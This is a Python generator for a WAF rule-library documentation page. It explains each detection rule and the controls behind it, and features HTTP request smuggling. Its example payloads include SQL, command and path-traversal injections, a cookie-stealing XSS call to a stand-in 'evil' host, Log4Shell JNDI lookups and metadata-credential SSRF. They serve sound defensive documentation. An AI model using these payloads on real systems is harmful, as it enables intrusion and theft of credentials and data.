#!/usr/bin/env python3
"""Generate the WAF rule-library landing page (``waf-rules.html``).

A documentation "sub landing page" that catalogues the full WSLProxy WAF rule
set — every attack signature plus every v2 enforcement stage — as a searchable
list where each entry expands to a detailed card (what it detects, how the
attack works, an example payload, how WSLProxy detects it, mitigation and
references). It opens on a featured explainer for **HTTP request smuggling**.

The signature entries are read from the shipped rule JSON so the catalogue can
never drift from the engine; the per-rule narrative (how/example/mitigation/
references) lives in ``AUGMENT`` below, and the non-signature controls live in
``CONTROLS``. Regenerate and commit both files:

    python3 examples/wslproxy-waf-demo/gen_waf_landing.py
"""
import glob
import html
import json
import os

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(os.path.dirname(HERE))
OUT = os.path.join(HERE, "waf-rules.html")

# Rule JSON sources: the 20 shipped base rules + the extended demo library.
RULE_GLOBS = [
    os.path.join(REPO, "data", "waf_rules", "prod", "*.json"),
    os.path.join(HERE, "data", "waf_rules", "prod", "*.json"),
]

SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}

# ---------------------------------------------------------------------------
# Per-signature narrative. Keyed by rule id. `how`/`example`/`mitigate`/`refs`
# augment the id, name, category, severity, target, pattern and description that
# are read straight from the rule JSON.
# ---------------------------------------------------------------------------
AUGMENT = {
    "waf-rule-sqli-001": dict(
        how="Appends a UNION SELECT so the database returns attacker-chosen columns from other tables, stitched onto the legitimate result set.",
        example="/products?cat=x' UNION SELECT username,password FROM users--",
        mitigate="Use parameterised queries / prepared statements and a least-privilege DB account; never concatenate input into SQL.",
        refs=["OWASP A03:2021 Injection", "CWE-89"]),
    "waf-rule-sqli-002": dict(
        how="A bare SELECT ... FROM injected into a parameter reads arbitrary tables or drives a stacked subquery.",
        example="/products?cat=1 UNION select card_number from cards",
        mitigate="Parameterise queries; validate that numeric/enum parameters are actually numeric/enum.",
        refs=["OWASP A03:2021", "CWE-89"]),
    "waf-rule-sqli-003": dict(
        how="A stacked write statement (INSERT/UPDATE/DELETE) smuggled after a separator tampers with data the query was never meant to change.",
        example="/account?id=1; UPDATE users SET role='admin' WHERE id=1--",
        mitigate="Disable multi-statement execution on the DB driver; parameterise; least-privilege grants.",
        refs=["OWASP A03:2021", "CWE-89"]),
    "waf-rule-sqli-004": dict(
        how="Destructive DDL (DROP/ALTER/TRUNCATE) injected into a parameter can delete tables or schema — a data-integrity and availability hit.",
        example="/account?id=1; DROP TABLE users--",
        mitigate="Application DB user must not hold DDL privileges; parameterise all input.",
        refs=["OWASP A03:2021", "CWE-89"]),
    "waf-rule-sqli-005": dict(
        how="An always-true boolean tautology (OR 1=1) collapses a WHERE clause so authentication is bypassed or every row is returned.",
        example="/login?user=admin'--  or  ?id=1 OR 1=1",
        mitigate="Parameterise; never build auth checks from string-concatenated SQL.",
        refs=["OWASP A03:2021", "CWE-89"]),
    "waf-rule-sqli-006": dict(
        how="SQL comment tokens (--, #, /*) truncate the rest of the original query. Shipped in MONITOR mode because comment characters also appear in benign input, so alone it only alarms.",
        example="/products?cat=deposit'--",
        mitigate="Parameterise; treat this signal as one input to the anomaly score, not a standalone block.",
        refs=["OWASP A03:2021", "CWE-89"]),
    "waf-rule-sqli-007": dict(
        how="Blind, time-based SQLi uses SLEEP()/BENCHMARK()/pg_sleep() to leak data one bit at a time through response latency.",
        example="/products?cat=1; SELECT SLEEP(5)",
        mitigate="Parameterise; add DB statement timeouts; monitor slow-query anomalies.",
        refs=["OWASP A03:2021", "CWE-89"]),
    "waf-rule-xss-001": dict(
        how="A <script> element reflected or stored unescaped runs attacker JavaScript in the victim's session — cookie/token theft, account takeover.",
        example="/search?q=<script>fetch('//evil/'+document.cookie)</script>",
        mitigate="Contextual output encoding + a strict Content-Security-Policy; framework auto-escaping.",
        refs=["OWASP A03:2021", "CWE-79"]),
    "waf-rule-xss-002": dict(
        how="A javascript: URI placed in an href/src runs script when the link or resource is activated.",
        example="/go?next=javascript:alert(document.domain)",
        mitigate="Allow-list URL schemes (http/https/mailto); encode attributes.",
        refs=["OWASP A03:2021", "CWE-79"]),
    "waf-rule-xss-003": dict(
        how="An inline event handler (onerror/onload/onmouseover) on an injected tag executes script without any <script> element.",
        example="/search?q=<img src=x onerror=alert(1)>",
        mitigate="Output-encode HTML attribute context; CSP that forbids inline handlers.",
        refs=["OWASP A03:2021", "CWE-79"]),
    "waf-rule-xss-004": dict(
        how="An injected resource-loading tag (img/iframe/svg with src/data) beacons out or loads a hostile document.",
        example="/search?q=<iframe src=//evil/x>",
        mitigate="Sanitise HTML with an allow-list parser; CSP frame/img-src.",
        refs=["OWASP A03:2021", "CWE-79"]),
    "waf-rule-xss-005": dict(
        how="DOM-XSS sinks (eval, document.write, innerHTML) reachable from a URL parameter execute script entirely client-side.",
        example="/page?tpl=eval(document.cookie)",
        mitigate="Avoid dangerous sinks; use textContent; Trusted Types + CSP.",
        refs=["OWASP A03:2021", "CWE-79"]),
    "waf-rule-cmdi-001": dict(
        how="A semicolon chains a second shell command onto one the app builds from user input, running arbitrary OS commands.",
        example="/ping?host=127.0.0.1;id",
        mitigate="Never pass input to a shell; use exec-array APIs with a fixed binary and validated args.",
        refs=["OWASP A03:2021", "CWE-78"]),
    "waf-rule-cmdi-002": dict(
        how="A pipe feeds the app command's output into an attacker command, or runs a second command.",
        example="/ping?host=127.0.0.1|cat /etc/passwd",
        mitigate="Argument allow-lists; no shell interpolation.",
        refs=["OWASP A03:2021", "CWE-78"]),
    "waf-rule-cmdi-003": dict(
        how="Backtick command substitution executes the enclosed command and inlines its output.",
        example="/ping?host=`id`",
        mitigate="Reject shell metacharacters; exec without a shell.",
        refs=["OWASP A03:2021", "CWE-78"]),
    "waf-rule-cmdi-004": dict(
        how="$(...) command substitution runs the enclosed command — the modern equivalent of backticks.",
        example="/ping?host=$(whoami)",
        mitigate="Exec-array APIs; strict input validation.",
        refs=["OWASP A03:2021", "CWE-78"]),
    "waf-rule-lfi-001": dict(
        how="../ path traversal escapes the intended directory to read arbitrary files on disk.",
        example="/statement?file=../../../../../../etc/passwd",
        mitigate="Canonicalise then verify the resolved path stays under an allow-listed base; prefer opaque file IDs.",
        refs=["OWASP A01:2021 Broken Access Control", "CWE-22"]),
    "waf-rule-lfi-002": dict(
        how="Direct references to sensitive OS files (/etc/passwd, /proc/self/environ) attempt to read secrets/config.",
        example="/statement?file=/proc/self/environ",
        mitigate="Never build filesystem paths from raw input; allow-list filenames.",
        refs=["OWASP A01:2021", "CWE-22"]),
    "waf-rule-lfi-003": dict(
        how="URL-encoded traversal (..%2f, %2e%2e/) evades naive ../ filters while still resolving to the same escape on the server.",
        example="/statement?file=..%2f..%2f..%2fetc/passwd",
        mitigate="Decode once, canonicalise, then bound-check the path; reject encoded traversal outright.",
        refs=["OWASP A01:2021", "CWE-22", "CWE-172"]),
    "waf-rule-proto-001": dict(
        how="A null byte (%00) truncates a string in C-backed code so an extension/allow-list check passes but the underlying call sees a different path.",
        example="/download?f=secret.pem%00.jpg",
        mitigate="Reject NUL and control bytes; use languages/APIs that are not NUL-terminated.",
        refs=["CWE-158", "CWE-626"]),
    "waf-rule-proto-002": dict(
        how="Encoded CRLF (%0d%0a) injected into a header value splits the HTTP response or injects headers (response splitting, cache poisoning).",
        example="/set?x=a%0d%0aSet-Cookie:session=attacker",
        mitigate="Reject CR/LF in header-bound values; use frameworks that forbid them.",
        refs=["CWE-93", "CWE-113"]),
    "waf-rule-ssti-001": dict(
        how="Server-side template injection: input rendered as a template is evaluated. {{7*7}}→49 proves execution; {{config}} exfiltrates secrets and often reaches RCE.",
        example="/render?tpl={{7*7}}  →  /render?tpl={{config}}",
        mitigate="Never render user input as a template; use logic-less/sandboxed templates.",
        refs=["OWASP A03:2021", "CWE-1336", "PortSwigger SSTI"]),
    "waf-rule-log4shell-001": dict(
        how="A ${jndi:ldap://…} lookup makes Log4j connect to an attacker directory and load+execute a remote Java class — unauthenticated RCE.",
        example="User-Agent: ${jndi:ldap://evil.example/a}",
        mitigate="Patch Log4j ≥ 2.17.x; set log4j2.formatMsgNoLookups=true; block outbound LDAP/RMI from app hosts.",
        refs=["CVE-2021-44228", "CWE-502", "CWE-917"]),
    "waf-rule-log4shell-002": dict(
        how="Obfuscated Log4j lookups (${lower:j}ndi, ${env:…}, ${::-}, nested ${${…}}) evade signatures that only match the literal 'jndi:'.",
        example="${${lower:j}ndi:ldap://evil.example/a}",
        mitigate="Same as CVE-2021-44228 patching; do not rely on naive jndi string filters.",
        refs=["CVE-2021-44228", "CWE-917"]),
    "waf-rule-spring4shell-001": dict(
        how="Spring data-binding is walked via class.module.classLoader.* to rewrite a Tomcat access-log valve into a webshell — RCE.",
        example="class.module.classLoader.resources.context.parent.pipeline.first.pattern=<%…%>",
        mitigate="Patch Spring; set disallowedFields on the binder; run on a patched Tomcat.",
        refs=["CVE-2022-22965", "CWE-94"]),
    "waf-rule-ssrf-001": dict(
        how="Server-side request forgery pointed at cloud instance-metadata (169.254.169.254, metadata.google.internal) steals short-lived instance credentials.",
        example="/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        mitigate="Block link-local/RFC1918 targets; enforce IMDSv2; egress allow-list; resolve+pin DNS.",
        refs=["OWASP A10:2021 SSRF", "CWE-918"]),
    "waf-rule-ssrf-002": dict(
        how="Dangerous URL schemes (gopher/dict/file/ftp/ldap) pivot an SSRF into internal services or local file reads.",
        example="/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20val",
        mitigate="Allow-list http/https only; forbid non-HTTP schemes in server-side fetchers.",
        refs=["OWASP A10:2021", "CWE-918"]),
    "waf-rule-nosqli-001": dict(
        how="A JSON query operator ($ne/$gt/$regex/$where) where a scalar is expected turns a MongoDB query always-true, bypassing authentication.",
        example='POST /api/login  {"user":"admin","pass":{"$ne":null}}',
        mitigate="Cast/validate types server-side; reject objects where strings are expected; use $eq explicitly.",
        refs=["OWASP A03:2021", "CWE-943"]),
    "waf-rule-jwt-none-001": dict(
        how="A forged JWT whose header declares alg:none is accepted by servers that skip signature verification — instant identity forgery.",
        example="Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
        mitigate="Pin allowed algorithms server-side and verify the signature (the WAF jwt stage rejects alg:none first-class).",
        refs=["OWASP A07:2021", "CWE-347"]),
    "waf-rule-protopollute-001": dict(
        how="A __proto__ / constructor.prototype key in a merged JSON body mutates Object.prototype, injecting properties (e.g. admin=true) onto every object.",
        example='POST /api/merge  {"__proto__":{"admin":true}}',
        mitigate="Parse to null-prototype objects; block __proto__/constructor keys; use Map instead of blind merge.",
        refs=["CWE-1321", "OWASP A08:2021"]),
    "waf-rule-xxe-001": dict(
        how="An XML external entity (<!ENTITY x SYSTEM 'file:///etc/passwd'>) makes the parser read local files or make outbound requests (SSRF).",
        example='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
        mitigate="Disable DTDs and external entities in the XML parser (FEATURE_SECURE_PROCESSING).",
        refs=["OWASP A05:2021", "CWE-611"]),
    "waf-rule-graphql-introspection-001": dict(
        how="A GraphQL introspection query maps the entire schema — including hidden mutations — giving an attacker a targeting map.",
        example='POST /graphql  {"query":"{__schema{types{name}}}"}',
        mitigate="Disable introspection in production; use persisted/allow-listed operations.",
        refs=["OWASP API8:2023", "CWE-200"]),
    "waf-rule-openredirect-001": dict(
        how="A redirect parameter pointing at an absolute external URL sends users to an attacker site (phishing, OAuth token theft). Shipped STAGED — alarms until its enforcement date.",
        example="/login?next=https://evil.example/phish",
        mitigate="Allow-list redirect targets or accept only relative paths; sign redirect state.",
        refs=["OWASP A01:2021", "CWE-601"]),
    "waf-rule-scanner-ua-001": dict(
        how="Automated recon tools announce themselves in the User-Agent (sqlmap, nikto, nuclei, nmap, …). Blocking them cuts noise and slows mapping.",
        example="User-Agent: sqlmap/1.7#stable (https://sqlmap.org)",
        mitigate="Block/deny known scanner UAs, rate-limit, and layer real bot management (UAs are trivially spoofed).",
        refs=["OWASP Automated Threats OAT-011", "CWE-799"]),
    "waf-rule-cmdi-json-001": dict(
        how="Command substitution $()/backticks, or shell chaining (||, &&, ;) into common binaries, hidden inside a JSON body rather than the query string.",
        example='POST /api/login  {"user":"a","pass":"x; id"}',
        mitigate="Exec-array APIs; validate body fields; never shell out with user data.",
        refs=["OWASP A03:2021", "CWE-78"]),
    "waf-rule-massassign-001": dict(
        how="A request body sets a privileged field (role/isAdmin/grant) the client must never control; a blind object merge escalates privilege.",
        example='POST /api/profile  {"user":"me","role":"admin"}',
        mitigate="Bind only an explicit allow-list of fields (DTO/serializer); never merge the whole body.",
        refs=["OWASP API6:2023 Mass Assignment", "CWE-915"]),
    "waf-rule-smuggling-001": dict(
        how="Catches the visible artefact of an HTTP request-smuggling payload: a second HTTP request line pipelined inside the body (the 0⏎⏎GET /admin HTTP/1.1 desync request), or an obfuscated Transfer-Encoding token in the inspected text.",
        example='POST /api/batch\\r\\n…\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: x',
        mitigate="Speak one framing end-to-end (prefer HTTP/2 to the origin); reject ambiguous requests; keep the smuggling stage enabled.",
        refs=["CWE-444", "OWASP WSTG-INPV-15", "PortSwigger HTTP request smuggling"],
        featured=True),
}

# ---------------------------------------------------------------------------
# Non-signature controls: the v2 enforcement stages + governance. These are the
# "positive security" half of the library — a request is denied unless it is
# known-good, or on a header/velocity/shape relationship a signature can't state.
# ---------------------------------------------------------------------------
CONTROLS = [
    dict(id="stage-method", name="Method allow-list", category="positive-security",
         severity="high", target="method", field="methods.allow", code="VIOL_METHOD",
         summary="Reject any HTTP method not on the policy allow-list.",
         how="Positive security: only the declared verbs are accepted; everything else is refused before the app sees it.",
         example="PUT /api/profile  →  403 VIOL_METHOD  (policy allows GET/POST/HEAD/OPTIONS)",
         mitigate="Declare the minimum method set your API actually uses.",
         refs=["OWASP API-Security", "positive security"]),
    dict(id="stage-filetype", name="Filetype deny-list", category="positive-security",
         severity="medium", target="url", field="filetypes.deny", code="VIOL_FILETYPE",
         summary="Block requests for source, backup, secret and VCS artefacts.",
         how="Matches a forbidden extension as a suffix or a path segment (e.g. /.git/), stopping accidental exposure of .env/.pem/.sql/.bak.",
         example="GET /config.env  or  GET /.git/config  →  403 VIOL_FILETYPE",
         mitigate="Never serve dotfiles/backups from the web root; this is defence-in-depth.",
         refs=["CWE-538", "OWASP A05:2021"]),
    dict(id="stage-smuggling", name="Request-smuggling / desync guard", category="protocol",
         severity="high", target="headers", field="smuggling", code="VIOL_SMUGGLING",
         summary="First-class header-relationship check for HTTP request smuggling (CWE-444).",
         how="Rejects the ambiguity that lets a front-end and back-end disagree on request boundaries: Content-Length together with Transfer-Encoding, duplicate or obfuscated Transfer-Encoding, and malformed Content-Length. A relationship between headers that a single-target signature cannot express — so it is a stage, paired with waf-rule-smuggling-001.",
         example="Content-Length: 6 + Transfer-Encoding: chunked  →  403 VIOL_SMUGGLING",
         mitigate="Use one consistent framing end-to-end (HTTP/2 upstream); reject ambiguous requests. Most load-bearing at the inner edge of a two-proxy topology.",
         refs=["CWE-444", "RFC 7230 §3.3.3", "PortSwigger HTTP request smuggling"],
         featured=True),
    dict(id="stage-ip-deny", name="IP allow / deny lists", category="reputation",
         severity="high", target="ip", field="ipLists", code="VIOL_IP_DENY",
         summary="CIDR allow/deny lists; allow-list membership short-circuits geo.",
         how="Exact or CIDR membership. An allow-listed source bypasses IP and geo checks entirely; a deny-listed source is refused.",
         example="Deny 5.6.7.0/24  →  403 VIOL_IP_DENY",
         mitigate="Pair with an IP-reputation feed; keep allow-lists tight.",
         refs=["CWE-284", "reputation"]),
    dict(id="stage-geo", name="Geo country deny", category="reputation",
         severity="high", target="ip", field="geo.denyCountries", code="VIOL_GEO",
         summary="Deny traffic from configured countries via IP2Location.",
         how="Resolves the client IP to an ISO country code and refuses it if the code is on the deny-list.",
         example="denyCountries: [KP]  →  request from KP  →  403 VIOL_GEO",
         mitigate="Geo blocking is coarse (VPN/proxy evade it); use as one signal, not a boundary.",
         refs=["reputation", "IP2Location"]),
    dict(id="stage-jwt", name="JWT algorithm policy", category="broken-auth",
         severity="high", target="headers", field="jwt.denyAlg / requireAlg", code="VIOL_JWT_ALG",
         summary="Decode the JWT header and enforce an algorithm policy — first-class, not a regex.",
         how="Parses the bearer token header and blocks a denied alg (none, HS256) or one outside the require-list (RS256/ES256), stopping alg-confusion and alg:none forgery at the edge.",
         example="Authorization: Bearer <alg:none jwt>  →  403 VIOL_JWT_ALG",
         mitigate="Verify signatures server-side too; pin algorithms; rotate keys.",
         refs=["OWASP A07:2021", "CWE-347"]),
    dict(id="stage-json-size", name="JSON body size cap", category="protocol",
         severity="medium", target="body", field="jsonProfile.maxBytes", code="VIOL_JSON_SIZE",
         summary="Reject JSON request bodies over a byte ceiling.",
         how="For application/json requests, refuses bodies larger than maxBytes before parsing — a cheap parser-abuse / memory guard.",
         example="20 KB JSON with maxBytes 16384  →  403 VIOL_JSON_SIZE",
         mitigate="Set body limits at every tier; stream large uploads out-of-band.",
         refs=["CWE-400", "protocol"]),
    dict(id="stage-json-depth", name="JSON body depth cap", category="protocol",
         severity="medium", target="body", field="jsonProfile.maxDepth", code="VIOL_JSON_DEPTH",
         summary="Reject deeply-nested JSON that abuses recursive parsers.",
         how="Parses the JSON and refuses it if nesting exceeds maxDepth — a nested-object DoS guard.",
         example="{'a':{'a':{…×11}}} with maxDepth 8  →  403 VIOL_JSON_DEPTH",
         mitigate="Cap nesting; prefer flat schemas; parser hardening.",
         refs=["CWE-400", "CWE-674"]),
    dict(id="stage-bruteforce", name="Brute-force velocity", category="brute-force",
         severity="high", target="url", field="bruteForce[]", code="VIOL_BRUTE_FORCE",
         summary="Per-key attempt ceiling on sensitive paths within a sliding window.",
         how="Counts attempts per client key (IP and/or a username param) on configured paths in a shared-dict window; over the threshold the request is refused.",
         example="6th POST /api/login within 60s (max 5)  →  403 VIOL_BRUTE_FORCE",
         mitigate="Add MFA, exponential backoff and account lockouts app-side.",
         refs=["OWASP API4:2023", "CWE-307"]),
    dict(id="stage-openapi-path", name="OpenAPI positive security — path", category="positive-security",
         severity="medium", target="url", field="openapi.paths", code="VIOL_OPENAPI_PATH",
         summary="Only endpoints declared in the OpenAPI surface are allowed under basePath.",
         how="Inverts signatures: a request under the API base is refused unless its path matches a declared route (with {param} templating).",
         example="GET /api/does-not-exist  →  403 VIOL_OPENAPI_PATH",
         mitigate="Keep the declared surface in sync with the spec; deny-by-default under /api.",
         refs=["OWASP API9:2023", "positive security"]),
    dict(id="stage-openapi-method", name="OpenAPI positive security — method", category="positive-security",
         severity="medium", target="url", field="openapi.paths[].methods", code="VIOL_OPENAPI_METHOD",
         summary="A declared endpoint still refuses methods it did not declare.",
         how="After the path matches, only the methods listed for that path are accepted.",
         example="POST /api/accounts/1001 (declared GET-only)  →  403 VIOL_OPENAPI_METHOD",
         mitigate="Declare the exact verb set per route.",
         refs=["OWASP API9:2023", "positive security"]),
    dict(id="stage-anomaly", name="Anomaly-score threshold", category="anomaly",
         severity="high", target="all", field="anomaly_threshold", code="VIOL_ANOMALY_SCORE",
         summary="Block when the summed score of matched signatures crosses a threshold.",
         how="Each signature carries a score; when several fire, their total is compared to anomaly_threshold and blocks even if no single rule is block-action — collaborative detection.",
         example="Three medium signatures scoring 4+4+5 ≥ threshold 6  →  403 VIOL_ANOMALY_SCORE",
         mitigate="Tune the threshold per service to trade sensitivity vs false positives.",
         refs=["Collaborative detection", "CRS anomaly scoring"]),
    dict(id="gov-staging", name="Signature governance (stage / disable / set toggle)", category="governance",
         severity="medium", target="policy", field="signatures.stage · signatures.disable · signatureSets",
         code="policy-as-code",
         summary="Roll rules out safely: alarm-only until a date, disable one ID, or downgrade a whole set.",
         how="A staged signature alarms (log-only) until its ISO date then enforces; a disabled ID is skipped; a signatureSet with block:false turns an entire category alarm-only. Staged/alarm matches never add to the anomaly score, so staging can't block indirectly.",
         example='signatures.stage: [{id: waf-rule-openredirect-001, until: 2026-12-31T00:00:00Z}]',
         mitigate="Stage every new blocking rule before enforcing; keep governance in version control.",
         refs=["Safe rollout", "policy-as-code"]),
]

# ---------------------------------------------------------------------------
FEATURED_HTML = """
      <span class=\"eyebrow\"><span class=\"dot\"></span> Featured · CWE-444</span>
      <h2>HTTP Request Smuggling</h2>
      <p class=\"lede\">Request smuggling exploits a disagreement between two HTTP
      servers on the same path — a front-end proxy and the back-end — about
      <b>where one request ends and the next begins</b>. By crafting ambiguous
      framing, an attacker prepends (“smuggles”) a hidden request that the
      back-end processes as if it were the next client's, bypassing front-end
      controls (WAF, auth), poisoning caches, or hijacking sessions.</p>
      <div class=\"grid3\">
        <div class=\"mini\"><h4>Header injection (CL.TE)</h4><p>The request carries both
        <code>Content-Length</code> and <code>Transfer-Encoding</code>. The front-end
        honours one, the back-end the other — so the byte the front-end thinks is body
        the back-end reads as a new request line.</p></div>
        <div class=\"mini\"><h4>Chunked encoding (TE.CL)</h4><p>An attacker breaks the body
        into chunks whose terminator (<code>0⏎⏎</code>) the two hops place
        differently, leaving a trailing <code>GET /admin HTTP/1.1</code> queued for the
        next victim.</p></div>
        <div class=\"mini\"><h4>Mixed / obfuscated (TE.TE)</h4><p>Duplicate or obfuscated
        <code>Transfer-Encoding</code> headers (<code>xchunked</code>, a leading tab,
        <code>chunked, identity</code>) make one hop chunk and the other not.</p></div>
      </div>
      <div class=\"impacts\">
        <span>Bypass WAF/auth controls</span><span>Cache poisoning</span>
        <span>Session / credential hijack</span><span>Request queue poisoning</span>
        <span>Info disclosure</span>
      </div>
      <h4 class=\"sub\">Example — a smuggled request pipelined in the body</h4>
      <pre><span class=c># the trailing request is processed by the back-end as a second, unauthenticated request</span>
POST /api/batch HTTP/1.1
Host: payments-secure.fictionally.org
Content-Type: text/plain

{\"batch\":\"noop\"}
0

GET /api/accounts/9999 HTTP/1.1
Host: x</pre>
      <h4 class=\"sub\">How WSLProxy stops it</h4>
      <ul class=\"how\">
        <li><b>Signature</b> <code>waf-rule-smuggling-001</code> (target <code>all</code>)
        matches a smuggled request line embedded in the body or an obfuscated
        <code>Transfer-Encoding</code> token — the artefact a normal client can put on
        the wire. <span class=\"tag block\">block</span></li>
        <li><b>Stage</b> <code>smuggling</code> → <code>VIOL_SMUGGLING</code> is a
        first-class header-relationship check: <code>Content-Length</code>+<code>Transfer-Encoding</code>
        together, duplicate/obfuscated <code>Transfer-Encoding</code>, malformed
        <code>Content-Length</code>. <span class=\"tag block\">block</span></li>
      </ul>
      <p class=\"foot\">Honest scope: a modern OpenResty/nginx front-end already rejects the
      crudest CL+TE frame with a <code>400</code> before Lua runs, so the WAF is
      defence-in-depth here — most load-bearing at the <b>inner</b> edge of a two-proxy
      topology, where an upstream can forward a <code>Transfer-Encoding</code> that only
      this layer sees.</p>
      <p class=\"foot\">References: OWASP WSTG-INPV-15 · PortSwigger Web Security Academy —
      HTTP request smuggling · CWE-444 (Inconsistent Interpretation of HTTP Requests).</p>
"""


def load_rules():
    seen, rules = {}, []
    for pat in RULE_GLOBS:
        for path in sorted(glob.glob(pat)):
            r = json.load(open(path))
            rid = r.get("id")
            if not rid or rid in seen:
                continue
            seen[rid] = True
            rules.append(r)
    return rules


def build_entries():
    entries = []
    for r in load_rules():
        rid = r["id"]
        aug = AUGMENT.get(rid, {})
        status = "monitor" if r.get("action") == "monitor" else "block"
        if rid == "waf-rule-openredirect-001":
            status = "staged"
        entries.append({
            "id": rid, "name": r.get("name", rid), "category": r.get("category", "custom"),
            "severity": r.get("severity", "medium"), "target": r.get("target", "url"),
            "kind": "signature", "status": status, "score": r.get("score"),
            "field": "signature (regex)", "pattern": r.get("pattern"),
            "summary": r.get("description", ""), "code": "VIOL_ATTACK_SIGNATURE",
            "how": aug.get("how", ""), "example": aug.get("example", ""),
            "detect": None, "mitigate": aug.get("mitigate", ""),
            "refs": aug.get("refs", []), "featured": aug.get("featured", False),
        })
    for c in CONTROLS:
        entries.append({
            "id": c["id"], "name": c["name"], "category": c["category"],
            "severity": c["severity"], "target": c["target"], "kind": "stage",
            "status": "enabled", "score": None, "field": c["field"], "pattern": None,
            "summary": c["summary"], "code": c["code"], "how": c["how"],
            "example": c["example"], "detect": None, "mitigate": c["mitigate"],
            "refs": c["refs"], "featured": c.get("featured", False),
        })
    # Sort: signatures first by severity then id, controls after.
    entries.sort(key=lambda e: (0 if e["kind"] == "signature" else 1,
                                SEV_ORDER.get(e["severity"], 9), e["id"]))
    return entries


def main():
    entries = build_entries()
    n_sig = sum(1 for e in entries if e["kind"] == "signature")
    n_stage = len(entries) - n_sig
    # Safe JSON-in-<script>: rule payloads contain literal "</script>" (the XSS
    # examples), which would otherwise close the inline script element in the
    # browser's HTML parser. Escaping < > & to \uXXXX keeps the JS string value
    # identical while the HTML parser never sees a tag boundary.
    data_json = (json.dumps(entries, ensure_ascii=False)
                 .replace("<", "\\u003c").replace(">", "\\u003e").replace("&", "\\u0026"))
    page = TEMPLATE.format(
        total=len(entries), n_sig=n_sig, n_stage=n_stage,
        featured=FEATURED_HTML, data=data_json)
    with open(OUT, "w") as f:
        f.write(page)
    print(f"wrote {OUT} — {len(entries)} entries ({n_sig} signatures + {n_stage} stages/controls)")


# --- self-contained page template (dark, no external deps) ------------------
TEMPLATE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WSLProxy WAF — Rule Library</title>
<style>
  :root{{
    --bg:#0b1020; --panel:#111827; --panel2:#0f1626; --line:#1f2937; --ink:#e5e7eb;
    --muted:#9aa4b8; --faint:#6b7280; --accent:#6366f1; --accent2:#818cf8;
    --safe:#34d399; --safe-soft:#0f2a22; --danger:#f87171; --danger-soft:#2a1518;
    --warn:#fbbf24; --warn-soft:#2a2312; --mono:ui-monospace,SFMono-Regular,Menlo,monospace;
    --crit:#f87171; --high:#fb923c; --med:#fbbf24; --low:#60a5fa;
  }}
  *{{box-sizing:border-box}}
  body{{margin:0;background:radial-gradient(1200px 600px at 80% -10%,#141d33,transparent),var(--bg);
    color:var(--ink);font:15px/1.55 system-ui,-apple-system,"Segoe UI",sans-serif}}
  a{{color:var(--accent2);text-decoration:none}} a:hover{{text-decoration:underline}}
  code{{font-family:var(--mono);font-size:.86em;background:#0c1424;border:1px solid var(--line);
    padding:.06rem .34rem;border-radius:5px;color:#c7d2fe}}
  .wrap{{max-width:1200px;margin:0 auto;padding:2.2rem 1.3rem 4rem}}
  header.top{{margin-bottom:1.4rem}}
  .eyebrow{{display:inline-flex;align-items:center;gap:.5rem;font:600 .74rem/1 var(--mono);
    letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}}
  .eyebrow .dot{{width:8px;height:8px;border-radius:50%;background:var(--accent);
    box-shadow:0 0 0 4px color-mix(in srgb,var(--accent) 22%,transparent)}}
  h1{{font-size:2rem;margin:.5rem 0 .3rem;letter-spacing:-.02em}}
  h1 .g{{color:var(--accent2)}}
  .sub{{color:var(--muted);max-width:65ch}}
  .stats{{display:flex;gap:.6rem;flex-wrap:wrap;margin:1rem 0 0}}
  .stat{{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:.5rem .8rem}}
  .stat b{{font-size:1.2rem}} .stat span{{color:var(--muted);font-size:.8rem;margin-left:.35rem}}
  .layout{{display:grid;grid-template-columns:minmax(340px,420px) 1fr;gap:1.4rem;margin-top:1.5rem;align-items:start}}
  @media(max-width:900px){{.layout{{grid-template-columns:1fr}}}}
  .controls{{position:sticky;top:1rem}}
  .search{{width:100%;background:var(--panel2);border:1px solid var(--line);border-radius:10px;
    color:var(--ink);padding:.6rem .8rem;font-size:.95rem;margin-bottom:.7rem}}
  .search::placeholder{{color:var(--faint)}}
  .chips{{display:flex;flex-wrap:wrap;gap:.35rem;margin-bottom:.7rem}}
  .chip{{font:600 .74rem/1 var(--mono);color:var(--muted);background:var(--panel);border:1px solid var(--line);
    border-radius:999px;padding:.34rem .6rem;cursor:pointer;text-transform:uppercase;letter-spacing:.03em}}
  .chip.on{{color:#fff;background:var(--accent);border-color:var(--accent)}}
  .list{{border:1px solid var(--line);border-radius:14px;overflow:hidden;max-height:70vh;overflow-y:auto;background:var(--panel)}}
  .row{{display:grid;grid-template-columns:14px 1fr auto;gap:.6rem;align-items:center;padding:.62rem .8rem;
    border-bottom:1px solid var(--line);cursor:pointer}}
  .row:last-child{{border-bottom:0}}
  .row:hover{{background:#0c1526}} .row.sel{{background:#111c33;box-shadow:inset 3px 0 0 var(--accent)}}
  .sev{{width:9px;height:9px;border-radius:50%}}
  .sev.critical{{background:var(--crit)}} .sev.high{{background:var(--high)}}
  .sev.medium{{background:var(--med)}} .sev.low{{background:var(--low)}}
  .rname{{font-weight:600;font-size:.92rem}} .rmeta{{color:var(--faint);font:.72rem/1.3 var(--mono)}}
  .kbadge{{font:600 .64rem/1 var(--mono);padding:.22rem .4rem;border-radius:5px;text-transform:uppercase;letter-spacing:.04em}}
  .kbadge.signature{{color:#c7d2fe;background:#171f38;border:1px solid #26304f}}
  .kbadge.stage{{color:#a7f3d0;background:#0f2a22;border:1px solid #1c4034}}
  .star{{color:var(--warn);font-size:.8rem}}
  .detail{{border:1px solid var(--line);border-radius:16px;background:linear-gradient(180deg,var(--panel),var(--panel2));
    padding:1.5rem 1.6rem;min-height:60vh}}
  .detail h2{{margin:.2rem 0 .5rem;font-size:1.55rem;letter-spacing:-.01em}}
  .detail .lede{{color:var(--muted);font-size:1.02rem}}
  .badges{{display:flex;flex-wrap:wrap;gap:.4rem;margin:.2rem 0 1rem}}
